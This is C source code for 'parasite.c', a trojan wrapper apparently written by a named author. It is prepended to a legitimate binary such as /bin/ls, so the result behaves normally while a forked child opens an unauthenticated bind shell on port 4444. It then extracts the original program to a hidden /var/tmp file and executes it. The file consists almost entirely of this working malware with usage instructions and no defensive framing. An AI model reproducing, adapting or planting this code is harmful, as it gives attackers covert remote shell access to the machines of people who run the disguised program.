/* parasite.c -- by @dmfroberson
 *
 * usage:
 * $ gcc -o parasite parasite.c
 * $ cat parasite /bin/ls >ls.new
 * $ chmod +x ls.new
 * $ ./ls.new
 *
 * This should work like normal "ls", but spawn a bind shell on 4444
 *
 * TODO
 * - clean up TEMPFILE
 * - randomize TEMPFILE
 */

#define _GNU_SOURCE // memmem() :(
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>

#define PORT 4444
#define TEMPFILE "/var/tmp/.987151jh1u890ykjqu1351kjhf8y1"


int main(int argc, char *argv[], char *envp[]) {
  int parasite;
  int orig;
  int len;
  int offset;
  char *buf, *buf2;
  char needle[] = {0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01}; // ELF Magic
  struct stat self;


  /* Start of malicious payload. Feel free to change this. */
  if (fork() == 0) {
    int s, c;
    struct sockaddr_in bindshell;
 
    bindshell.sin_family = AF_INET;
    bindshell.sin_addr.s_addr = INADDR_ANY;
    bindshell.sin_port = htons(PORT);
    
    s = socket(AF_INET, SOCK_STREAM, 0);

    bind(s, (struct sockaddr*)&bindshell, sizeof(bindshell));
    listen(s, 0);

    c = accept(s, NULL, NULL);

    dup2(c, STDERR_FILENO);
    dup2(c, STDOUT_FILENO);
    dup2(c, STDIN_FILENO);

    execl("/bin/sh", "sh", NULL);
  }
  /* End of malicious payload */

  /* Try to open current program for reading */
  if ((parasite = open("/proc/self/exe", O_RDONLY)) < 0) {
    exit(EXIT_FAILURE);
  }
  
  if (fstat(parasite, &self) < 0) {
    exit(EXIT_FAILURE);
  }

  /* Read executable into memory */
  len = self.st_size;

  buf = malloc(len);
  if (buf == NULL) {
    exit(EXIT_FAILURE);
  }

  /* Skip first ELF header */
  if (lseek(parasite, sizeof(needle), SEEK_SET) != sizeof(needle)) {
    exit(EXIT_FAILURE);
  }
  if (read(parasite, buf, len - sizeof(needle)) != len - sizeof(needle)) {
    exit(EXIT_FAILURE);
  }

  /* Calculate offset to second ELF header */
  buf2 = memmem(buf, len - sizeof(needle), needle, sizeof(needle));
  if (buf2 == NULL) {
    exit(EXIT_FAILURE);
  }

  offset = (long)buf2 - (long)buf + strlen(needle);

  /* Write copy of original file to TEMPFILE */
  if (lseek(parasite, offset, SEEK_SET) != offset) {
    exit(EXIT_FAILURE);
  }

  if (read(parasite, buf, len - offset) != len - offset) {
    exit(EXIT_FAILURE);
  }
  close(parasite);

  if ((orig = open(TEMPFILE, O_RDWR | O_CREAT | O_TRUNC, self.st_mode)) < 0) {
    exit(EXIT_FAILURE);
  }

  if (write(orig, buf, len) != len) {
    exit(EXIT_FAILURE);
  }
  
  free(buf);
  close(orig);

  /* Execute TEMPFILE */
  exit(execve(TEMPFILE, argv, envp));
}
